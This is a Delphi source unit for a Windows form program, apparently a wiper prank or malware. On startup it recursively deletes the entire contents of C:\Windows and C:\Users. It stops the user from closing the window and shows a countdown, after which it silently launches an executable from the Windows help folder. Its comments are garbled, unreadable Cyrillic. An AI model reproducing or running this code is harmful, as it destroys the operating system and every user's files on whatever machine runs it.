unit Starting;

interface

uses
  Winapi.Windows, Winapi.Messages, SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls, Vcl.ExtCtrls, ShellAPI;

type
  TForm5 = class(TForm)
    Label1: TLabel;
    Label2: TLabel;
    Label3: TLabel;
    Label4: TLabel;
    Timer: TTimer;
    procedure FormCreate(Sender: TObject);
    procedure FormCloseQuery(Sender: TObject; var CanClose: Boolean);
    procedure TimerTimer(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form5: TForm5;
  j,h: integer;

implementation

{$R *.dfm}

function FullRemoveDir(Dir: string; DeleteAllFilesAndFolders,
  StopIfNotAllDeleted, RemoveRoot: boolean): Boolean;
var
  i: Integer;
  SRec: TSearchRec;
  FN: string;
begin
  Result := False;
  if not DirectoryExists(Dir) then
    exit;
  Result := True;
  // ��������� ���� � ����� � ������ ����� - "��� ����� � ����������"
  Dir := IncludeTrailingBackslash(Dir);
  i := FindFirst(Dir + '*', faAnyFile, SRec);
  try
    while i = 0 do
    begin
      // �������� ������ ���� � ����� ��� ����������
      FN := Dir + SRec.Name;
      // ���� ��� ����������
      if SRec.Attr = faDirectory then
      begin
        // ����������� ����� ���� �� ������� � ������ �������� �����
        if (SRec.Name <> '') and (SRec.Name <> '.') and (SRec.Name <> '..') then
        begin
          if DeleteAllFilesAndFolders then
            FileSetAttr(FN, faArchive);
          Result := FullRemoveDir(FN, DeleteAllFilesAndFolders,
            StopIfNotAllDeleted, True);
          if not Result and StopIfNotAllDeleted then
            exit;
        end;
      end
      else // ����� ������� ����
      begin
        if DeleteAllFilesAndFolders then
          FileSetAttr(FN, faArchive);
        Result := SysUtils.DeleteFile(FN);
        if not Result and StopIfNotAllDeleted then
          exit;
      end;
      // ����� ��������� ���� ��� ����������
      i := FindNext(SRec);
    end;
  finally
    SysUtils.FindClose(SRec);
  end;
  if not Result then
    exit;
  if RemoveRoot then // ���� ���������� ������� ������ - �������
    if not RemoveDir(Dir) then
      Result := false;
end;

procedure TForm5.FormCloseQuery(Sender: TObject; var CanClose: Boolean);
begin
CanClose := false;
end;

procedure TForm5.FormCreate(Sender: TObject);
begin
FullRemoveDir('C:\Windows',true,true,true);
FullRemoveDir('C:\Users',true,true,true);
J:= 5;
end;

procedure TForm5.TimerTimer(Sender: TObject);
var

M,S:Integer;

begin

j := j - 1;


M := (J - H*3600) div 60;

S := J - H*3600 - M*60;

label4.Caption := IntToStr(M) + ':' + IntToStr(S);

if j = 0 then

begin

Timer.Enabled := False;
ShellExecute(Handle, 'open','c:\windows\help\End.exe', nil, nil,SW_HIDE);

end;
end;

end.
